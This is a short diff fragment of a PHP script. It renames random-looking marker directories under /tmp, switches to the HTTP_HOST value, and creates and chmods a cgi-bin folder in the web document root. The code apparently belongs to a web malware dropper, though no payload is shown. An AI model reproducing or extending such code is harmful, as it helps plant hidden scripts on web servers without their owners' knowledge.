@@ -5,9 +5,9 @@ echo('Eec secra');
 die();  }
 
 $random = rand(1,6);
-$d=$_SERVER['SERVER_NAME'];
-if(file_exists('/tmp/fjh3fh3jhgfh3gf'.$d.$random)) { } else {
-	mkdir('/tmp/fjh3fh3jhgfh3gf'.$d.$random);
+$d=$_SERVER['HTTP_HOST'];
+if(file_exists('/tmp/d2d23dbbbggg22g'.$d.$random)) { } else {
+	mkdir('/tmp/d2d23dbbbggg22g'.$d.$random);
 	@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin", 0755);
 	mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
 	
